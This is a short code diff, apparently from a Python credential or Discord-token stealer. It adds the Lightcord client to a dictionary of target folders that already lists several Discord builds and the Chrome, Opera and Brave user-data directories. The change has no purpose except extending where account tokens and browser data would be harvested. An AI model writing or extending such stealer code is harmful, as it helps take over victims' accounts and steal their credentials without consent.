@@ -21,6 +21,7 @@ PATHS = {
     "Discord Canary": ROAMING + "\\\\discordcanary",
     "Discord PTB": ROAMING + "\\\\discordptb",
     'Discord Development': ROAMING + '\\\\discorddevelopment',
+    'Lightcord': ROAMING + '\\\\lightcord',
     "Google Chrome": LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
     "Opera": ROAMING + "\\\\Opera Software\\\\Opera Stable",
     "Brave": LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
